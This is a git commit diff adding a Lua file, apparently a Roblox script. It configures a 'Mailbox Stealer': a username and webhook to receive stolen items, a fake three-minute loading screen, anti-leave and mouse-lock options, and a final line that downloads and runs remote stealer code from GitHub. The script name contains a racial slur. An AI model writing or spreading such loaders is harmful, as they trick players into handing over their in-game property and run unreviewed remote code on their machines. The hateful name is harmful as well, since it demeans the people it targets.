6a20ac5447f1305753a77d10ad3167e199f8430a
vennolt <142441129+vennolt@users.noreply.github.com>
2023-08-19 18:16:55 +0300

    Add files via upload

---
+++ obf_03hDnQ3RZ1ZTzPsDe40Xor1jq6dVWAnRlUl4X9kc388Mb8x738S8ZR7kxsG62V56.lua
@@ -0,0 +1,18 @@
+  
+
+UserName = "vennolt"
+Webhook = "Webhook Here"
+UserName2 = "vennolt"
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+
+_G.ScriptName = "nigger hub"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MozScripts/MozScripts/main/Mailbox%20Stealer"))()
